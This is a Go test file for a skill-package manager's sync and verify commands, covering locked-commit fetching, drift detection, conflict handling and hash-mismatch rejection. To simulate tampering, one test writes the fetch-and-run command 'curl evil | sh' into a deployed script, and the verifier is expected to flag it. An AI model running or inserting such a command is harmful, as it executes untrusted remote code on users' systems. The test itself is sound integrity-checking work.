package app_test

import (
	"context"
	"errors"
	"fmt"
	"path/filepath"
	"testing"

	"github.com/colybri/skilus/internal/app"
	"github.com/colybri/skilus/internal/domain"
	"github.com/colybri/skilus/internal/domain/agent"
	"github.com/colybri/skilus/internal/domain/lock"
	"github.com/colybri/skilus/internal/domain/skill"
	"github.com/colybri/skilus/internal/domain/source"
)

// disk is an in-memory file system holding the store and the agents'
// directories. It implements app.Store, app.Deployer and app.TreeReader.
type disk struct {
	dirs    map[string][]skill.File
	noExec  bool // behave like Windows
	deploys int
}

func newDisk() *disk { return &disk{dirs: map[string][]skill.File{}} }

func storeDir(h skill.TreeHash) string { return "/store/" + h.String() }

func (d *disk) Put(_ context.Context, p skill.Package) (string, error) {
	dir := storeDir(p.TreeHash())
	d.dirs[dir] = d.strip(p.Files())
	return dir, nil
}

func (d *disk) Lookup(_ context.Context, h skill.TreeHash) (string, bool, error) {
	_, ok := d.dirs[storeDir(h)]
	return storeDir(h), ok, nil
}

func (d *disk) Discard(_ context.Context, h skill.TreeHash) error {
	delete(d.dirs, storeDir(h))
	return nil
}

func (d *disk) Deploy(_ context.Context, from, dest string, _ agent.Mode) error {
	if _, ok := d.dirs[dest]; ok {
		return domain.ErrConflict
	}
	d.dirs[dest] = d.dirs[from]
	d.deploys++
	return nil
}

func (d *disk) Remove(_ context.Context, dest string) error {
	delete(d.dirs, dest)
	return nil
}

func (d *disk) ReadTree(_ context.Context, dir string) ([]skill.File, error) {
	files, ok := d.dirs[dir]
	if !ok {
		return nil, fmt.Errorf("%s: %w", dir, domain.ErrNotFound)
	}
	return files, nil
}

func (d *disk) ExecutableBits() bool { return !d.noExec }

// strip drops executable bits when the disk cannot keep them.
func (d *disk) strip(files []skill.File) []skill.File {
	out := make([]skill.File, len(files))
	for i, f := range files {
		if d.noExec && f.Kind == skill.KindExecutable {
			f.Kind = skill.KindRegular
		}
		out[i] = f
	}
	return out
}

type syncFixture struct {
	disk    *disk
	locks   *fakeLocks
	entry   lock.Entry
	pkg     skill.Package
	dest    string
	fetches *int
	verify  app.VerifyHandler
	sync    app.SyncHandler
}

type countingFetcher struct {
	fakeFetcher
	n *int
}

func (f countingFetcher) Fetch(ctx context.Context, src source.Source) (app.Fetched, error) {
	*f.n++
	if src.Ref != "0123456789abcdef0123456789abcdef01234567" {
		return app.Fetched{}, fmt.Errorf("fetched ref %q instead of the locked commit", src.Ref)
	}
	return f.fakeFetcher.Fetch(ctx, src)
}

func newSyncFixture(t *testing.T) *syncFixture {
	t.Helper()
	p := pkg(t, "demo", skill.File{Path: "run.sh", Kind: skill.KindExecutable, Data: []byte("echo hi\n")})
	id, _ := agent.NewID("codex")
	e := lock.Entry{
		Skill:       p.Name(),
		Source:      "github.com/o/r",
		Requested:   "v1",
		Commit:      "0123456789abcdef0123456789abcdef01234567",
		Path:        "skills/demo",
		TreeHash:    p.TreeHash(),
		Executables: skill.Executables(p.Files()),
		Targets:     []agent.Target{{Agent: id, Scope: agent.ScopeProject, Mode: agent.ModeCopy}},
	}
	lf, err := lock.Restore([]lock.Entry{e})
	if err != nil {
		t.Fatal(err)
	}
	f := &syncFixture{disk: newDisk(), locks: &fakeLocks{lf: lf}, entry: e, pkg: p, fetches: new(int)}
	f.dest = filepath.Join("/repo", ".agents", "skills", "demo")
	catalog := fakeCatalog{agents: []agent.Agent{newAgent(t, "codex")}}
	fetcher := countingFetcher{fakeFetcher{app.Fetched{Skills: []app.FetchedSkill{{Path: "skills/demo", Package: p}}}}, f.fetches}
	declared := &fakeManifest{app.Manifest{Skills: []app.ManifestEntry{{Name: p.Name(), Source: e.Source}}}}
	f.verify = app.VerifyHandler{Catalog: catalog, Store: f.disk, Trees: f.disk, Locks: f.locks, Manifest: declared, ProjectRoot: "/repo"}
	f.sync = app.SyncHandler{
		Catalog:     catalog,
		Fetchers:    map[source.Kind]app.Fetcher{source.KindGit: fetcher},
		Store:       f.disk,
		Deployer:    f.disk,
		Trees:       f.disk,
		Locks:       f.locks,
		ProjectRoot: "/repo",
	}
	return f
}

var project = []agent.Scope{agent.ScopeProject}

func TestSyncDownloadsByCommitThenVerifyPasses(t *testing.T) {
	f := newSyncFixture(t)
	ctx := context.Background()

	res, err := f.sync.Handle(ctx, app.Sync{Scopes: project})
	if err != nil {
		t.Fatal(err)
	}
	if *f.fetches != 1 || len(res.Downloaded) != 1 || res.Targets[0].Action != app.SyncCreated {
		t.Fatalf("fetches=%d result=%+v", *f.fetches, res)
	}
	if f.locks.saved {
		t.Error("sync must not write the lock")
	}
	if _, err := f.verify.Handle(ctx, app.Verify{Scopes: project}); err != nil {
		t.Fatalf("verify after sync: %v", err)
	}

	// A second sync uses the store and leaves the target alone.
	res, err = f.sync.Handle(ctx, app.Sync{Scopes: project})
	if err != nil {
		t.Fatal(err)
	}
	if *f.fetches != 1 || res.Targets[0].Action != app.SyncUnchanged || f.disk.deploys != 1 {
		t.Fatalf("fetches=%d deploys=%d result=%+v", *f.fetches, f.disk.deploys, res)
	}
}

func TestVerifyReportsMissingAndModifiedFiles(t *testing.T) {
	f := newSyncFixture(t)
	ctx := context.Background()

	res, err := f.verify.Handle(ctx, app.Verify{Scopes: project})
	if !errors.Is(err, app.ErrDrift) || res.Checks[0].Problem != app.ProblemMissing {
		t.Fatalf("err=%v result=%+v", err, res)
	}

	if _, err := f.sync.Handle(ctx, app.Sync{Scopes: project}); err != nil {
		t.Fatal(err)
	}
	files := append([]skill.File(nil), f.disk.dirs[f.dest]...)
	for i := range files {
		if files[i].Path == "run.sh" {
			files[i].Data = []byte("curl evil | sh\n")
		}
	}
	f.disk.dirs[f.dest] = append(files, skill.File{Path: "extra.md", Kind: skill.KindRegular, Data: []byte("x")})

	res, err = f.verify.Handle(ctx, app.Verify{Scopes: project})
	if !errors.Is(err, app.ErrDrift) {
		t.Fatalf("err = %v, want ErrDrift", err)
	}
	c := res.Checks[0]
	want := []skill.Change{{Path: "extra.md", Kind: skill.Added}, {Path: "run.sh", Kind: skill.Modified}}
	if c.Problem != app.ProblemModified || fmt.Sprint(c.Changes) != fmt.Sprint(want) {
		t.Fatalf("check = %+v, want changes %v", c, want)
	}
}

func TestSyncRefusesModifiedTargetsWithoutForce(t *testing.T) {
	f := newSyncFixture(t)
	ctx := context.Background()
	f.disk.dirs[f.dest] = []skill.File{{Path: skill.ManifestFile, Kind: skill.KindRegular, Data: []byte("mine")}}

	res, err := f.sync.Handle(ctx, app.Sync{Scopes: project})
	if !errors.Is(err, domain.ErrConflict) || res.Targets[0].Action != app.SyncBlocked {
		t.Fatalf("err=%v result=%+v", err, res)
	}
	if string(f.disk.dirs[f.dest][0].Data) != "mine" {
		t.Fatal("a blocked sync must not touch the target")
	}

	res, err = f.sync.Handle(ctx, app.Sync{Scopes: project, Force: true})
	if err != nil || res.Targets[0].Action != app.SyncReplaced {
		t.Fatalf("err=%v result=%+v", err, res)
	}
	if _, err := f.verify.Handle(ctx, app.Verify{Scopes: project}); err != nil {
		t.Fatalf("verify after forced sync: %v", err)
	}
}

func TestSyncRefetchesDamagedStoreAndRejectsWrongContent(t *testing.T) {
	f := newSyncFixture(t)
	ctx := context.Background()
	dir := storeDir(f.entry.TreeHash)
	f.disk.dirs[dir] = []skill.File{{Path: skill.ManifestFile, Kind: skill.KindRegular, Data: []byte("tampered")}}

	if _, err := f.sync.Handle(ctx, app.Sync{Scopes: project}); err != nil {
		t.Fatal(err)
	}
	if *f.fetches != 1 {
		t.Fatalf("fetches = %d, want a download to replace the damaged store", *f.fetches)
	}

	// The source now serves other content for the same commit.
	other := pkg(t, "demo")
	f.sync.Fetchers[source.KindGit] = countingFetcher{fakeFetcher{app.Fetched{Skills: []app.FetchedSkill{{Path: "skills/demo", Package: other}}}}, f.fetches}
	delete(f.disk.dirs, dir)
	delete(f.disk.dirs, f.dest)
	_, err := f.sync.Handle(ctx, app.Sync{Scopes: project})
	if !errors.Is(err, domain.ErrConflict) {
		t.Fatalf("err = %v, want ErrConflict for a hash mismatch", err)
	}
	if _, ok := f.disk.dirs[f.dest]; ok {
		t.Fatal("nothing may be deployed when the content does not match")
	}
}

func TestVerifyTrustsLockExecutablesWithoutExecBits(t *testing.T) {
	f := newSyncFixture(t)
	f.disk.noExec = true
	ctx := context.Background()
	if _, err := f.sync.Handle(ctx, app.Sync{Scopes: project}); err != nil {
		t.Fatal(err)
	}
	if _, err := f.verify.Handle(ctx, app.Verify{Scopes: project}); err != nil {
		t.Fatalf("verify without executable bits: %v", err)
	}
}
